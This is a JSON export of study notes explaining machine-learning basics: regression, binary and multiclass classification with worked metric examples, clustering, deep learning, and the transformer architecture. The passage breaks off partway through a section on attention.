{"AI/Binary-Classification":{"title":"Binary Classification","links":["AI/Regression","AI/Machine-Learning","AI/Multiclass-Classification"],"tags":[],"content":"What is it?\nClassification, like Regression, is a supervised Machine Learning technique; and therefore follows the same iterative process of training, validating, and evaluating models. Instead of calculating numeric values like a Regression model, the algorithms used to train classification models calculate probability values for class assignment and the evaluation metrics used to assess model performance compare the predicted classes to the actual classes.\nBinary classification algorithms are used to train a model that predicts one of two possible labels for a single class. Essentially, predicting true or false. In most real scenarios, the data observations used to train and validate the model consist of multiple feature (x) values and a y value that is either 1 or 0.\nExample\nTo understand how binary classification works, let’s look at a simplified example that uses a single feature (x) to predict whether the label y is 1 or 0. In this example, we’ll use the blood glucose level of a patient to predict whether or not the patient has diabetes. Here’s the data with which we’ll train the model:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nBlood glucose (x)Diabetic? (y)670103111417201161650\nTraining a binary classification model\nTo train the model, we’ll use an algorithm to fit the training data to a function that calculates the probability of the class label being true (in other words, that the patient has diabetes). Probability is measured as a value between 0.0 and 1.0, such that the total probability for all possible classes is 1.0. So for example, if the probability of a patient having diabetes is 0.7, then there’s a corresponding probability of 0.3 that the patient isn’t diabetic.\nThere are many algorithms that can be used for binary classification, such as logistic Regression, which derives a sigmoid (S-shaped) function with values between 0.0 and 1.0, like this:\n\nNote:\nDespite its name, in Machine Learning logistic Regression is used for classification, not Regression. The important point is the logistic nature of the function it produces, which describes an S-shaped curve between a lower and upper value (0.0 and 1.0 when used for binary classification).\nThe function produced by the algorithm describes the probability of y being true (y=1) for a given value of x. Mathematically, you can express the function like this:\nf(x) = P(y=1 | x)\nFor three of the six observations in the training data, we know that y is definitely true, so the probability for those observations that y=1 is 1.0 and for the other three, we know that y is definitely false, so the probability that y=1 is 0.0. The S-shaped curve describes the probability distribution so that plotting a value of x on the line identifies the corresponding probability that y is 1.\nThe diagram also includes a horizontal line to indicate the threshold at which a model based on this function will predict true (1) or false (0). The threshold lies at the mid-point for y (P(y) = 0.5). For any values at this point or above, the model will predict true (1); while for any values below this point it will predict false (0). For example, for a patient with a blood glucose level of 90, the function would result in a probability value of 0.9. Since 0.9 is higher than the threshold of 0.5, the model would predict true (1) - in other words, the patient is predicted to have diabetes.\nEvaluating a binary classification model\nAs with Regression, when training a binary classification model you hold back a random subset of data with which to validate the trained model. Let’s assume we held back the following data to validate our diabetes classifier:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nBlood glucose (x)Diabetic? (y)66010711121710871891\nApplying the logistic function we derived previously to the x values results in the following plot.\n\nBased on whether the probability calculated by the function is above or below the threshold, the model generates a predicted label of 1 or 0 for each observation. We can then compare the predicted class labels (ŷ) to the actual class labels (y), as shown here:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nBlood glucose (x)Actual diabetes diagnosis (y)Predicted diabetes diagnosis (ŷ)66001071111211710087108911\nBinary classification evaluation metrics\nThe first step in calculating evaluation metrics for a binary classification model is usually to create a matrix of the number of correct and incorrect predictions for each possible class label:\n\nThis visualization is called a confusion matrix, and it shows the prediction totals where:\n\nŷ=0 and y=0: True negatives (TN)\nŷ=1 and y=0: False positives (FP)\nŷ=0 and y=1: False negatives (FN)\nŷ=1 and y=1: True positives (TP)\n\nThe arrangement of the confusion matrix is such that correct (true) predictions are shown in a diagonal line from top-left to bottom-right. Often, color-intensity is used to indicate the number of predictions in each cell, so a quick glance at a model that predicts well should reveal a deeply shaded diagonal trend.\nAccuracy\nThe simplest metric you can calculate from the confusion matrix is accuracy - the proportion of predictions that the model got right. Accuracy is calculated as:\n(TN+TP) ÷ (TN+FN+FP+TP)\nIn the case of our diabetes example, the calculation is:\n\n(2+3) ÷ (2+1+0+3)\n= 5 ÷ 6\n= 0.83\n\nSo for our validation data, the diabetes classification model produced correct predictions 83% of the time.\nAccuracy might initially seem like a good metric to evaluate a model, but consider this. Suppose 11% of the population has diabetes. You could create a model that always predicts 0, and it would achieve an accuracy of 89%, even though it makes no real attempt to differentiate between patients by evaluating their features. What we really need is a deeper understanding of how the model performs at predicting 1 for positive cases and 0 for negative cases.\nRecall\nRecall is a metric that measures the proportion of positive cases that the model identified correctly. In other words, compared to the number of patients who have diabetes, how many did the model predict to have diabetes?\nThe formula for recall is:\nTP ÷ (TP+FN)\nFor our diabetes example:\n\n3 ÷ (3+1)\n= 3 ÷ 4\n= 0.75\n\nSo our model correctly identified 75% of patients who have diabetes as having diabetes.\nPrecision\nPrecision is a similar metric to recall, but measures the proportion of predicted positive cases where the true label is actually positive. In other words, what proportion of the patients predicted by the model to have diabetes actually have diabetes?\nThe formula for precision is:\nTP ÷ (TP+FP)\nFor our diabetes example:\n\n3 ÷ (3+0)\n= 3 ÷ 3\n= 1.0\n\nSo 100% of the patients predicted by our model to have diabetes do in fact have diabetes.\nF1-score\nF1-score is an overall metric that combined recall and precision. The formula for F1-score is:\n(2 x Precision x Recall) ÷ (Precision + Recall)\nFor our diabetes example:\n\n(2 x 1.0 x 0.75) ÷ (1.0 + 0.75)\n= 1.5 ÷ 1.75\n= 0.86\n\nArea Under the Curve (AUC)\nAnother name for recall is the true positive rate (TPR), and there’s an equivalent metric called the false positive rate (FPR) that is calculated as FP÷(FP+TN). We already know that the TPR for our model when using a threshold of 0.5 is 0.75, and we can use the formula for FPR to calculate a value of 0÷2 = 0.\nOf course, if we were to change the threshold above which the model predicts true (1), it would affect the number of positive and negative predictions; and therefore change the TPR and FPR metrics. These metrics are often used to evaluate a model by plotting a received operator characteristic (ROC) curve that compares the TPR and FPR for every possible threshold value between 0.0 and 1.0:\n\nThe ROC curve for a perfect model would go straight up the TPR axis on the left and then across the FPR axis at the top. Since the plot area for the curve measures 1x1, the area under this perfect curve would be 1.0 (meaning that the model is correct 100% of the time). In contrast, a diagonal line from the bottom-left to the top-right represents the results that would be achieved by randomly guessing a binary label; producing an area under the curve of 0.5. In other words, given two possible class labels, you could reasonably expect to guess correctly 50% of the time.\nIn the case of our diabetes model, the curve above is produced, and the area under the curve (AUC) metric is 0.875. Since the AUC is higher than 0.5, we can conclude the model performs better at predicting whether or not a patient has diabetes than randomly guessing.\n\nNext: Multiclass Classification"},"AI/Clustering":{"title":"Clustering","links":["AI/Machine-Learning","AI/Deep-learning"],"tags":[],"content":"Clustering is a form of unsupervised Machine Learning in which observations are grouped into clusters based on similarities in their data values, or features. This kind of Machine Learning is considered unsupervised because it doesn’t make use of previously known label values to train a model. In a clustering model, the label is the cluster to which the observation is assigned, based only on its features.\nExample\nFor example, suppose a botanist observes a sample of flowers and records the number of leaves and petals on each flower:\n\nThere are no known labels in the dataset, just two features. The goal is not to identify the different types (species) of flower; just to group similar flowers together based on the number of leaves and petals.\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nLeaves (x1)Petals (x2)050613131618232728\nTraining a clustering model\nThere are multiple algorithms you can use for clustering. One of the most commonly used algorithms is K-Means clustering, which consists of the following steps:\n\nThe feature (x) values are vectorized to define n-dimensional coordinates (where n is the number of features). In the flower example, we have two features: number of leaves (x1) and number of petals (x2). So, the feature vector has two coordinates that we can use to conceptually plot the data points in two-dimensional space ([x1,x2])\nYou decide how many clusters you want to use to group the flowers - call this value k. For example, to create three clusters, you would use a k value of 3. Then k points are plotted at random coordinates. These points become the center points for each cluster, so they’re called centroids.\nEach data point (in this case a flower) is assigned to its nearest centroid.\nEach centroid is moved to the center of the data points assigned to it based on the mean distance between the points.\nAfter the centroid is moved, the data points may now be closer to a different centroid, so the data points are reassigned to clusters based on the new closest centroid.\nThe centroid movement and cluster reallocation steps are repeated until the clusters become stable or a predetermined maximum number of iterations is reached.\n\nThe following animation shows this process:\n\nEvaluating a clustering model\nSince there’s no known label with which to compare the predicted cluster assignments, evaluation of a clustering model is based on how well the resulting clusters are separated from one another.\nThere are multiple metrics that you can use to evaluate cluster separation, including:\n\nAverage distance to cluster center: How close, on average, each point in the cluster is to the centroid of the cluster.\nAverage distance to other center: How close, on average, each point in the cluster is to the centroid of all other clusters.\nMaximum distance to cluster center: The furthest distance between a point in the cluster and its centroid.\nSilhouette: A value between -1 and 1 that summarizes the ratio of distance between points in the same cluster and points in different clusters (The closer to 1, the better the cluster separation).\n\n\nNext: Deep learning"},"AI/Deep-learning":{"title":"Deep learning","links":["AI/Machine-Learning","AI/Regression","AI/Transformers"],"tags":[],"content":"Deep learning is an advanced form of Machine Learning that tries to emulate the way the human brain learns. The key to deep learning is the creation of an artificial neural network that simulates electrochemical activity in biological neurons by using mathematical functions, as shown here.\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nBiological neural networkArtificial neural networkNeurons fire in response to electrochemical stimuli. When fired, the signal is passed to connected neurons.Each neuron is a function that operates on an input value (x) and a weight (w). The function is wrapped in an activation function that determines whether to pass the output on.\nArtificial neural networks are made up of multiple layers of neurons - essentially defining a deeply nested function. This architecture is the reason the technique is referred to as deep learning and the models produced by it are often referred to as deep neural networks (DNNs). You can use deep neural networks for many kinds of Machine Learning problem, including Regression and classification, as well as more specialized models for natural language processing and computer vision.\nJust like other Machine Learning techniques discussed in this module, deep learning involves fitting training data to a function that can predict a label (y) based on the value of one or more features (x). The function (f(x)) is the outer layer of a nested function in which each layer of the neural network encapsulates functions that operate on x and the weight (w) values associated with them. The algorithm used to train the model involves iteratively feeding the feature values (x) in the training data forward through the layers to calculate output values for ŷ, validating the model to evaluate how far off the calculated ŷ values are from the known y values (which quantifies the level of error, or loss, in the model), and then modifying the weights (w) to reduce the loss. The trained model includes the final weight values that result in the most accurate predictions.\nExample - Using deep learning for classification\nTo better understand how a deep neural network model works, let’s explore an example in which a neural network is used to define a classification model for penguin species.\n\nThe feature data (x) consists of some measurements of a penguin. Specifically, the measurements are:\n\nThe length of the penguin’s bill.\nThe depth of the penguin’s bill.\nThe length of the penguin’s flippers.\nThe penguin’s weight.\n\nIn this case, x is a vector of four values, or mathematically, x=[x1,x2,x3,x4].\nThe label we’re trying to predict (y) is the species of the penguin, and that there are three possible species it could be:\n\nAdelie\nGentoo\nChinstrap\n\nThis is an example of a classification problem, in which the Machine Learning model must predict the most probable class to which an observation belongs. A classification model accomplishes this by predicting a label that consists of the probability for each class. In other words, y is a vector of three probability values; one for each of the possible classes: [P(y=0|x), P(y=1|x), P(y=2|x)].\nThe process for inferencing a predicted penguin class using this network is:\n\nThe feature vector for a penguin observation is fed into the input layer of the neural network, which consists of a neuron for each x value. In this example, the following x vector is used as the input: [37.3, 16.8, 19.2, 30.0]\nThe functions for the first layer of neurons each calculate a weighted sum by combining the x value and w weight, and pass it to an activation function that determines if it meets the threshold to be passed on to the next layer.\nEach neuron in a layer is connected to all of the neurons in the next layer (an architecture sometimes called a fully connected network) so the results of each layer are fed forward through the network until they reach the output layer.\nThe output layer produces a vector of values; in this case, using a softmax or similar function to calculate the probability distribution for the three possible classes of penguin. In this example, the output vector is: [0.2, 0.7, 0.1]\nThe elements of the vector represent the probabilities for classes 0, 1, and 2. The second value is the highest, so the model predicts that the species of the penguin is 1 (Gentoo).\n\nHow does a neural network learn?\nThe weights in a neural network are central to how it calculates predicted values for labels. During the training process, the model learns the weights that will result in the most accurate predictions. Let’s explore the training process in a little more detail to understand how this learning takes place.\n\n\nThe training and validation datasets are defined, and the training features are fed into the input layer.\nThe neurons in each layer of the network apply their weights (which are initially assigned randomly) and feed the data through the network.\nThe output layer produces a vector containing the calculated values for ŷ. For example, an output for a penguin class prediction might be [0.3. 0.1. 0.6].\nA loss function is used to compare the predicted ŷ values to the known y values and aggregate the difference (which is known as the loss). For example, if the known class for the case that returned the output in the previous step is Chinstrap, then the y value should be [0.0, 0.0, 1.0]. The absolute difference between this and the ŷ vector is [0.3, 0.1, 0.4]. In reality, the loss function calculates the aggregate variance for multiple cases and summarizes it as a single loss value.\nSince the entire network is essentially one large nested function, an optimization function can use differential calculus to evaluate the influence of each weight in the network on the loss, and determine how they could be adjusted (up or down) to reduce the amount of overall loss. The specific optimization technique can vary, but usually involves a gradient descent approach in which each weight is increased or decreased to minimize the loss.\nThe changes to the weights are backpropagated to the layers in the network, replacing the previously used values.\nThe process is repeated over multiple iterations (known as epochs) until the loss is minimized and the model predicts acceptably accurately.\n\nNote\nWhile it’s easier to think of each case in the training data being passed through the network one at a time, in reality the data is batched into matrices and processed using linear algebraic calculations. For this reason, neural network training is best performed on computers with graphical processing units (GPUs) that are optimized for vector and matrix manipulation.\n\nNext: Transformers"},"AI/Foundations-of-AI":{"title":"Foundations of AI","links":["AI/Regression"],"tags":[],"content":"Modern AI is built on a foundation of data science and machine learning. The primary goal of AI is to use machines for capabilities that are usually associated with humans. Let’s see data science concepts support the foundation of AI.\nWhat is data science?\nData science is an interdisciplinary field whose aim is to achieve AI. It primarily uses machine learning and statistics techniques. In most cases, data scientists are the experts in charge of solving AI problems.\nWhat is machine learning?\nMachine learning is a technique where a machine sifts through numerous amounts of data to find patterns. This technique is frequently used for AI purposes. Machine learning uses algorithms that train a machine to learn patterns based on differentiating features about the data. The more training data, the more accurate the predictions.\nHere are some examples:\n\nEmail spam detection - Machine learning could look for patterns where email has words like “free” or “guarantee”, the email address domain is on a blocked list, or a link displayed in text doesn’t match the URL behind it.\nCredit card fraud detection - Machine learning could look for patterns like the spending in a zip code the owner doesn’t usually visit, buying an expensive item, or a sudden shopping spree.\n\nWhat is deep learning?\nDeep learning is a subset of machine learning. Deep learning is imitating how a human brain processes information, as a connected artificial neural network. Unlike machine learning, deep learning can discover complex patterns and differentiating features about the data on its own. It normally works with unstructured data like images, text, and audio. It requires enormous amounts of data for better analysis and massive computing power for speed.\nFor instance, deep learning can be used to detect cancerous cells in medical images. Deep learning scans every pixel in the image as input to the neural nodes. The nodes analyze each pixel to filter out features that look cancerous. Each layer of nodes pushes findings of potential cancerous cells to the next layer of nodes to repeat the process and eventually aggregate all of the findings to classify the image. For example, the image might be classified as a healthy image or an image with cancerous features.\n\nNext: Regression"},"AI/Machine-Learning":{"title":"Machine Learning","links":[],"tags":[],"content":"Fundamentally, a machine learning model is a software application that encapsulates a function to calculate an output value based on one or more input values. The process of defining that function is known as training. After the function has been defined, you can use it to predict new values in a process called inferencing.\nTypes of Machine Learning\nA breakdown of common types of machine learning is shown in the following diagram.\n\nSupervised machine learning\nSupervised machine learning is a general term for machine learning algorithms in which the training data includes both feature values and known label values. Supervised machine learning is used to train models by determining a relationship between the features and labels in past observations, so that unknown labels can be predicted for features in future cases.\nRegression\nRegression is a form of supervised machine learning in which the label predicted by the model is a numeric value. For example:\n\nThe number of ice creams sold on a given day, based on the temperature, rainfall, and windspeed.\nThe selling price of a property based on its size in square feet, the number of bedrooms it contains, and socio-economic metrics for its location.\nThe fuel efficiency (in miles-per-gallon) of a car based on its engine size, weight, width, height, and length.\n\nClassification\nClassification is a form of supervised machine learning in which the label represents a categorization, or class. There are two common classification scenarios.\nBinary classification\nIn binary classification, the label determines whether the observed item is (or isn’t) an instance of a specific class. Or put another way, binary classification models predict one of two mutually exclusive outcomes. For example:\n\nWhether a patient is at risk for diabetes based on clinical metrics like weight, age, blood glucose level, and so on.\nWhether a bank customer will default on a loan based on income, credit history, age, and other factors.\nWhether a mailing list customer will respond positively to a marketing offer based on demographic attributes and past purchases.\n\nIn all of these examples, the model predicts a binary true/false or positive/negative prediction for a single possible class.\nMulticlass classification\nMulticlass classification extends binary classification to predict a label that represents one of multiple possible classes. For example,\n\nThe species of a penguin (Adelie, Gentoo, or Chinstrap) based on its physical measurements.\nThe genre of a movie (comedy, horror, romance, adventure, or science fiction) based on its cast, director, and budget.\n\nIn most scenarios that involve a known set of multiple classes, multiclass classification is used to predict mutually exclusive labels. For example, a penguin can’t be both a Gentoo and an Adelie. However, there are also some algorithms that you can use to train multilabel classification models, in which there may be more than one valid label for a single observation. For example, a movie could potentially be categorized as both science fiction and comedy.\nUnsupervised machine learning\nUnsupervised machine learning involves training models using data that consists only of feature values without any known labels. Unsupervised machine learning algorithms determine relationships between the features of the observations in the training data.\nClustering\nThe most common form of unsupervised machine learning is clustering. A clustering algorithm identifies similarities between observations based on their features, and groups them into discrete clusters. For example:\n\nGroup similar flowers based on their size, number of leaves, and number of petals.\nIdentify groups of similar customers based on demographic attributes and purchasing behavior.\n\nIn some ways, clustering is similar to multiclass classification; in that it categorizes observations into discrete groups. The difference is that when using classification, you already know the classes to which the observations in the training data belong; so the algorithm works by determining the relationship between the features and the known classification label. In clustering, there’s no previously known cluster label and the algorithm groups the data observations based purely on similarity of features.\nIn some cases, clustering is used to determine the set of classes that exist before training a classification model. For example, you might use clustering to segment your customers into groups, and then analyze those groups to identify and categorize different classes of customer (high value - low volume, frequent small purchaser, and so on). You could then use your categorizations to label the observations in your clustering results and use the labeled data to train a classification model that predicts to which customer category a new customer might belong."},"AI/Multiclass-Classification":{"title":"Multiclass Classification","links":["AI/Machine-Learning","AI/Regression","AI/Binary-Classification","AI/Clustering"],"tags":[],"content":"Multiclass classification is used to predict to which of multiple possible classes an observation belongs. As a supervised Machine Learning technique, it follows the same iterative train, validate, and evaluate process as Regression and Binary Classification in which a subset of the training data is held back to validate the trained model.\nExample\nMulticlass classification algorithms are used to calculate probability values for multiple class labels, enabling a model to predict the most probable class for a given observation.\nLet’s explore an example in which we have some observations of penguins, in which the flipper length (x) of each penguin is recorded. For each observation, the data includes the penguin species (y), which is encoded as follows:\n\n0: Adelie\n1: Gentoo\n2: Chinstrap\n\nNote:\nA real scenario would include multiple feature (x) values. We’ll use a single feature to keep things simple.\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nFlipper length (x)Species (y)1670172022521971189123221580\nTraining a multiclass classification model\nTo train a multiclass classification model, we need to use an algorithm to fit the training data to a function that calculates a probability value for each possible class. There are two kinds of algorithm you can use to do this:\n\nOne-vs-Rest (OvR) algorithms\nMultinomial algorithms\n\nOne-vs-Rest (OvR) algorithms\nOne-vs-Rest algorithms train a Binary Classification function for each class, each calculating the probability that the observation is an example of the target class. Each function calculates the probability of the observation being a specific class compared to any other class. For our penguin species classification model, the algorithm would essentially create three Binary Classification functions:\n\nf0(x) = P(y=0 | x)\nf1(x) = P(y=1 | x)\nf2(x) = P(y=2 | x)\n\nEach algorithm produces a sigmoid function that calculates a probability value between 0.0 and 1.0. A model trained using this kind of algorithm predicts the class for the function that produces the highest probability output.\nMultinomial algorithms\nAs an alternative approach is to use a multinomial algorithm, which creates a single function that returns a multi-valued output. The output is a vector (an array of values) that contains the probability distribution for all possible classes - with a probability score for each class which when totaled add up to 1.0:\nf(x) =[P(y=0|x), P(y=1|x), P(y=2|x)]\nAn example of this kind of function is a softmax function, which could produce an output like the following example:\n[0.2, 0.3, 0.5]\nThe elements in the vector represent the probabilities for classes 0, 1, and 2 respectively; so in this case, the class with the highest probability is 2.\nRegardless of which type of algorithm is used, the model uses the resulting function to determine the most probable class for a given set of features (x) and predicts the corresponding class label (y).\nEvaluating a multiclass classification model\nYou can evaluate a multiclass classifier by calculating Binary Classification metrics for each individual class. Alternatively, you can calculate aggregate metrics that take all classes into account.\nLet’s assume that we’ve validated our multiclass classifier, and obtained the following results:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nFlipper length (x)Actual species (y)Predicted species (ŷ)16500171002052119511183112212221422\nThe confusion matrix for a multiclass classifier is similar to that of a binary classifier, except that it shows the number of predictions for each combination of predicted (ŷ) and actual class labels (y):\n\nFrom this confusion matrix, we can determine the metrics for each individual class as follows:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nClassTPTNFPFNAccuracyRecallPrecisionF1-Score025001.01.01.01.0124100.861.00.670.8224010.860.671.00.8\nTo calculate the overall accuracy, recall, and precision metrics, you use the total of the TP, TN, FP, and FN metrics:\n\nOverall accuracy = (13+6)÷(13+6+1+1) = 0.90\nOverall recall = 6÷(6+1) = 0.86\nOverall precision = 6÷(6+1) = 0.86\n\nThe overall F1-score is calculated using the overall recall and precision metrics:\n\nOverall F1-score = (2x0.86x0.86)÷(0.86+0.86) = 0.86\n\n\nNext: Clustering"},"AI/Regression":{"title":"Regression","links":["AI/Machine-Learning","AI/Binary-Classification"],"tags":[],"content":"Regression models are trained to predict numeric label values based on training data that includes both features and known labels.\nTraining a regression model\nProcess\n\nThe diagram shows four key elements of the training process for supervised Machine Learning models:\n\nSplit the training data (randomly) to create a dataset with which to train the model while holding back a subset of the data that you’ll use to validate the trained model.\nUse an algorithm to fit the training data to a model. In the case of a regression model, use a regression algorithm such as linear regression.\nUse the validation data you held back to test the model by predicting labels for the features.\nCompare the known actual labels in the validation dataset to the labels that the model predicted. Then aggregate the differences between the predicted and actual label values to calculate a metric that indicates how accurately the model predicted for the validation data.\n\nExample\nWe’ll start by splitting the data and using a subset of it to train a model. Here’s the training dataset:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nTemperature (x)Ice cream sales (y)51165146920722375268130\nTo get an insight of how these x and y values might relate to one another, we can plot them as coordinates along two axes, like this:\n\nNow we’re ready to apply an algorithm to our training data and fit it to a function that applies an operation to x to calculate y. One such algorithm is linear regression, which works by deriving a function that produces a straight line through the intersections of the x and y values while minimizing the average distance between the line and the plotted points, like this:\n\nThe line is a visual representation of the function in which the slope of the line describes how to calculate the value of y for a given value of x. The line intercepts the x axis at 50, so when x is 50, y is 0. As you can see from the axis markers in the plot, the line slopes so that every increase of 5 along the x axis results in an increase of 5 up the y axis; so when x is 55, y is 5; when x is 60, y is 10, and so on. To calculate a value of y for a given value of x, the function simply subtracts 50; in other words, the function can be expressed like this:\nf(x) = x-50\nYou can use this function to predict the number of ice creams sold on a day with any given temperature. For example, suppose the weather forecast tells us that tomorrow it will be 77 degrees. We can apply our model to calculate 77-50 and predict that we’ll sell 27 ice creams tomorrow.\nBut just how accurate is our model?\nRegression evaluation metrics\nBased on the differences between the predicted and actual values, you can calculate some common metrics that are used to evaluate a regression model.\nMean Absolute Error (MAE)\nThe variance in this example indicates by how many ice creams each prediction was wrong. It doesn’t matter if the prediction was over or under the actual value (so for example, -3 and +3 both indicate a variance of 3). This metric is known as the absolute error for each prediction, and can be summarized for the whole validation set as the mean absolute error (MAE).\nIn the ice cream example, the mean (average) of the absolute errors (2, 3, 3, 1, 2, and 3) is 2.33.\nMean Squared Error (MSE)\nThe mean absolute error metric takes all discrepancies between predicted and actual labels into account equally. However, it may be more desirable to have a model that is consistently wrong by a small amount than one that makes fewer, but larger errors. One way to produce a metric that “amplifies” larger errors by squaring the individual errors and calculating the mean of the squared values. This metric is known as the mean squared error (MSE).\nIn our ice cream example, the mean of the squared absolute values (which are 4, 9, 9, 1, 4, and 9) is 6.\nRoot Mean Squared Error (RMSE)\nThe mean squared error helps take the magnitude of errors into account, but because it squares the error values, the resulting metric no longer represents the quantity measured by the label. In other words, we can say that the MSE of our model is 6, but that doesn’t measure its accuracy in terms of the number of ice creams that were mis predicted; 6 is just a numeric score that indicates the level of error in the validation predictions.\nIf we want to measure the error in terms of the number of ice creams, we need to calculate the square root of the MSE; which produces a metric called, unsurprisingly, Root Mean Squared Error. In this case √6, which is 2.45 (ice creams).\nCoefficient of determination (R2)\nAll of the metrics so far compare the discrepancy between the predicted and actual values in order to evaluate the model. However, in reality, there’s some natural random variance in the daily sales of ice cream that the model takes into account. In a linear regression model, the training algorithm fits a straight line that minimizes the mean variance between the function and the known label values. The coefficient of determination (more commonly referred to as R2 or R-Squared) is a metric that measures the proportion of variance in the validation results that can be explained by the model, as opposed to some anomalous aspect of the validation data (for example, a day with a highly unusual number of ice creams sales because of a local festival).\nThe calculation for R2 is more complex than for the previous metrics. It compares the sum of squared differences between predicted and actual labels with the sum of squared differences between the actual label values and the mean of actual label values, like this:\nR2 = 1- ∑(y-ŷ)2 ÷ ∑(y-ȳ)2\nThe result of metric is a value between 0 and 1 that describes the proportion of variance explained by the model. In simple terms, the closer to 1 this value is, the better the model is fitting the validation data. In the case of the ice cream regression model, the R2 calculated from the validation data is 0.95.\n\nNext: Binary Classification"},"AI/Transformers":{"title":"Transformers","links":[],"tags":[],"content":"Generative AI applications are powered by language models, which are a specialized type of machine learning model that you can use to perform natural language processing (NLP) tasks, including:\n\nDetermining sentiment or otherwise classifying natural language text.\nSummarizing text.\nComparing multiple text sources for semantic similarity.\nGenerating new natural language.\n\nWhile the mathematical principles behind these language models can be complex, a basic understanding of the architecture used to implement them can help you gain a conceptual understanding of how they work.\nTransformer models\nMachine learning models for natural language processing have evolved over many years. Today’s cutting-edge large language models are based on the transformer architecture, which builds on and extends some techniques that have been proven successful in modeling vocabularies to support NLP tasks - and in particular in generating language. Transformer models are trained with large volumes of text, enabling them to represent the semantic relationships between words and use those relationships to determine probable sequences of text that make sense. Transformer models with a large enough vocabulary are capable of generating language responses that are tough to distinguish from human responses.\nTransformer model architecture consists of two components, or blocks:\n\nAn encoder block that creates semantic representations of the training vocabulary.\nA decoder block that generates new language sequences.\n\n\n\nThe model is trained with a large volume of natural language text, often sourced from the internet or other public sources of text.\nThe sequences of text are broken down into tokens (for example, individual words) and the encoder block processes these token sequences using a technique called attention to determine relationships between tokens (for example, which tokens influence the presence of other tokens in a sequence, different tokens that are commonly used in the same context, and so on.)\nThe output from the encoder is a collection of vectors (multi-valued numeric arrays) in which each element of the vector represents a semantic attribute of the tokens. These vectors are referred to as embeddings.\nThe decoder block works on a new sequence of text tokens and uses the embeddings generated by the encoder to generate an appropriate natural language output.\nFor example, given an input sequence like &quot;When my dog was&quot;, the model can use the attention technique to analyze the input tokens and the semantic attributes encoded in the embeddings to predict an appropriate completion of the sentence, such as &quot;a puppy&quot;.\n\nIn practice, the specific implementations of the architecture vary – for example, the Bidirectional Encoder Representations from Transformers (BERT) model developed by Google to support their search engine uses only the encoder block, while the Generative Pretrained Transformer (GPT) model developed by OpenAI uses only the decoder block.\nWhile a complete explanation of every aspect of transformer models is beyond the scope of this module, an explanation of some of the key elements in a transformer can help you get a sense for how they support generative AI.\nTokenization\nThe first step in training a transformer model is to decompose the training text into tokens - in other words, identify each unique text value. For the sake of simplicity, you can think of each distinct word in the training text as a token (though in reality, tokens can be generated for partial words, or combinations of words and punctuation).\nFor example, consider the following sentence:\nI heard a dog bark loudly at a cat\nTo tokenize this text, you can identify each discrete word and assign token IDs to them. For example:\n- I (1)\n- heard (2)\n- a (3)\n- dog (4)\n- bark (5)\n- loudly (6)\n- at (7)\n- (&quot;a&quot; is already tokenized as 3)\n- cat (8)\n\nThe sentence can now be represented with the tokens: {1 2 3 4 5 6 7 3 8}. Similarly, the sentence &quot;I heard a cat&quot; could be represented as {1 2 3 8}.\nAs you continue to train the model, each new token in the training text is added to the vocabulary with appropriate token IDs:\n- meow (9)\n- skateboard (10)\n- *and so on...*\n\nWith a sufficiently large set of training text, a vocabulary of many thousands of tokens could be compiled.\nEmbeddings\nWhile it may be convenient to represent tokens as simple IDs - essentially creating an index for all the words in the vocabulary, they don’t tell us anything about the meaning of the words, or the relationships between them. To create a vocabulary that encapsulates semantic relationships between the tokens, we define contextual vectors, known as embeddings, for them. Vectors are multi-valued numeric representations of information, for example [10, 3, 1] in which each numeric element represents a particular attribute of the information. For language tokens, each element of a token’s vector represents some semantic attribute of the token. The specific categories for the elements of the vectors in a language model are determined during training based on how commonly words are used together or in similar contexts.\nVectors represent lines in multidimensional space, describing direction and distance along multiple axes (you can impress your mathematician friends by calling these amplitude and magnitude). It can be useful to think of the elements in an embedding vector for a token as representing steps along a path in multidimensional space. For example, a vector with three elements represents a path in 3-dimensional space in which the element values indicate the units traveled forward/back, left/right, and up/down. Overall, the vector describes the direction and distance of the path from origin to end.\nThe elements of the tokens in the embeddings space each represent some semantic attribute of the token, so that semantically similar tokens should result in vectors that have a similar orientation – in other words they point in the same direction. A technique called cosine similarity is used to determine if two vectors have similar directions (regardless of distance), and therefore represent semantically linked words. As a simple example, suppose the embeddings for our tokens consist of vectors with three elements, for example:\n- 4 (&quot;dog&quot;): [10,3,2]\n- 8 (&quot;cat&quot;): [10,3,1]\n- 9 (&quot;puppy&quot;): [5,2,1]\n- 10 (&quot;skateboard&quot;): [-3,3,2]\n\nWe can plot these vectors in three-dimensional space, like this:\n\nThe embedding vectors for &quot;dog&quot; and &quot;puppy&quot; describe a path along an almost identical direction, which is also fairly similar to the direction for &quot;cat&quot;. The embedding vector for &quot;skateboard&quot; however describes journey in a very different direction.\nNote\nThe previous example shows a simple example model in which each embedding has only three dimensions. Real language models have many more dimensions.\nThere are multiple ways you can calculate appropriate embeddings for a given set of tokens, including language modeling algorithms like Word2Vec or the encoder block in a transformer model.\nAttention\nThe encoder and decoder blocks in a transformer model include multiple layers that form the neural network for the model. We don’t need to go into the details of all these layers, but it’s useful to consider one of the types of layers that is used in both blocks: attention layers. Attention is a technique used to examine a sequence of text tokens and try to quantify the strength of the relationships between them. In particular, self-attention involves considering how other tokens around one particular token influence that token’s meaning.\nIn an encoder block, each token is carefully examined in context, and an appropriate encoding is determined for its vector embedding. The vector values are based on the relationship between the token and other tokens with which it frequently appears. This contextualized approach means that the same word might have multiple 